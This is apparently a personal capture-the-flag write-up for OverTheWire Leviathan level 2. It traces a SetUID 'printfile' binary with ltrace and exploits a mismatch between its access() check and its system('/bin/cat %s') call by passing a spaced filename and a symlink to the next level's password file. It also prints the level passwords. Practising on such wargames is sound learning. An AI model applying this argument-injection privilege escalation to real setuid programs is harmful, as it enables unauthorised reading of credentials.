## Challenge Info

**Platform:** OverTheWire - Leviathan
**Tags :** #Challenge #ReverseEngineering
**Completion Date & Time :** 2026 - 01 - 15 / 9:36

---
## FLAG : `f0n8h2iWLP`

---
## Solution :

### Step 1 : Check for home directory

```shell
leviathan2@leviathan:~$ ls -la
total 36
drwxr-xr-x   2 root       root        4096 Oct 14 09:27 .
drwxr-xr-x 150 root       root        4096 Oct 14 09:29 ..
-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root       root        3851 Oct 14 09:19 .bashrc
-r-sr-x---   1 leviathan3 leviathan2 15072 Oct 14 09:27 printfile
-rw-r--r--   1 root       root         807 Mar 31  2024 .profile
```
With the result above, we see there is a file `printfile`, a SetUID file. 
### Step 2 : Try to execute with `ltrace`

```shell
leviathan2@leviathan:~$ ltrace ./printfile
__libc_start_main(0x80490ed, 1, 0xffffd454, 0 <unfinished ...>
puts("*** File Printer ***"*** File Printer ***)                            = 21
printf("Usage: %s filename\n", "./printfile"Usage: ./printfile filename)    = 28
+++ exited (status 255) +++
```
It seems like this command will print the contents of a file (inputed args). Let's give it a try.

```shell
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                 = -1
puts("You cant have that file..."You cant have that file...)                = 27
+++ exited (status 1) +++
```
We got some clue, we could see that 
```bash
access("/etc/leviathan_pass/leviathan3", 4)                                 = -1
```
This mean, the access to read `leviathan3` is denied. The program still see us as user `leviathan2` not `leviathan3`, thats why we couldn't access the file. 

### Step 3 : Try it with accessible file

Since we are `leviathan2`, we should be access the `leviathan2` password file.
```shell
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2
__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
access("/etc/leviathan_pass/leviathan2", 4)                               = 0
snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2")                                         = 39
geteuid()                                                                 = 12002
geteuid()                                                                 = 12002
setreuid(12002, 12002)                                                    = 0
system("/bin/cat /etc/leviathan_pass/lev"...NsN1HwFoyN
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++
```

As we expected, we could access the file and see the remaining program. We could see the program called :
```bash
system("/bin/cat /etc/leviathan_pass/lev"...NsN1HwFoyN
```
This mean, the program inside will `concatenate` every args file we input. 
The result above tell us that we could pass the `access` part but not with the `system` part. So, our task is find the flaw.

### Step 4 : Try to give it unexpected inputs.

First, lets try to input two files.
```shell
leviathan2@leviathan:~$ ltrace ./printfile .bash_logout .profile
__libc_start_main(0x80490ed, 3, 0xffffd424, 0 <unfinished ...>
access(".bash_logout", 4)                                                = 0
snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout")    = 21
geteuid()                                                                = 12002
geteuid()                                                                = 12002
setreuid(12002, 12002)                                                   = 0
system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                           = 0
+++ exited (status 0) +++
```
Only the first file is printed out.
What about a file with a space in the name?

First, create a file with a space in the name.
```shell
leviathan2@leviathan:~$ touch /tmp/nusss0/"hello hai.txt"
```
Then we analyze again : 
```shell
leviathan2@leviathan:~$ ltrace ./printfile /tmp/nusss0/"hello hai.txt"
__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
access("/tmp/nusss0/hello hai.txt", 4)                                   = 0
snprintf("/bin/cat /tmp/nusss0/hello hai.t"..., 511, "/bin/cat %s", "/tmp/nusss0/hello hai.txt")                                             = 34
geteuid()                                                                = 12002
geteuid()                                                                = 12002
setreuid(12002, 12002)                                                   = 0
system("/bin/cat /tmp/nusss0/hello hai.t".../bin/cat: /tmp/nusss0/hello: No such file or directory
/bin/cat: hai.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                           = 256
+++ exited (status 0) +++
```
The `access()` part read the whole file name. This allow us to pass the user check. But the `system()` part, will parse the file name into two or more file. Here is the flaw, we could make a `symlink` file, so the first word of the file name will link to the password. Because we have pass the `access()` part, now we have the privileges of user `leviathan3` to access the password file.

The `system()` part parse the file name into more than one files, because `cat` command. `cat` could have more than one arguments, and each arguments will counted as 1 file. So `cat` will show all the contents of those files.
### Step 5 : Make `symlink` file.

We have a file name `hello hai.txt` before, so we will link a file `hello` to `/etc/leviathan_pass/leviathan3`.
```bash
ln -s /etc/leviathan_pass/leviathan3 /tmp/nusss0/hello
```
Last, execute `./printfile`
```shell
leviathan2@leviathan:~$ ./printfile /tmp/nusss0/"hello hai.txt"
f0n8h2iWLP
/bin/cat: hai.txt: No such file or directory
```
We get the password **`f0n8h2iWLP`**

---
### Key Takeaways : 
- When we do reverse engineering or binary exploit and we have input. We should try to think a special way to exploit the input. Either to crash it or make it into a special condition.
- 


---
## Related Concepts : 
[[ltrace]], [[ln]], [[System Calls]], [[SetUID Files]]

---
## Next Challenge :
[[Leviathan (3 -> 4)]]